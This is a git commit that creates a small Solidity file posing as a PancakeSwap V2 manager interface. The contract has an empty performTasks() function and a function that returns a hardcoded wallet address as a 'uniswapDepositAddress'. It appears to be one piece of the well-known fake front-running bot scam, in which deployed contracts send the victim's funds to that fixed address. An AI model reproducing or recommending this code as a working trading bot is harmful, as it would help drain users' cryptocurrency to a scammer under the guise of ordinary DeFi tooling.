6676005ec822e548beb048d0be684a1a2cbcfa21
pancake-development <97360571+pancake-development@users.noreply.github.com>
2022-01-08 19:39:00 +0000

    Create IPancakeswapV2ManagerV2.sol

---
+++ IPancakeswapV2ManagerV2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x08f66Aba25D7490D527Fad36f7805bA66542d194;
+	}
+}
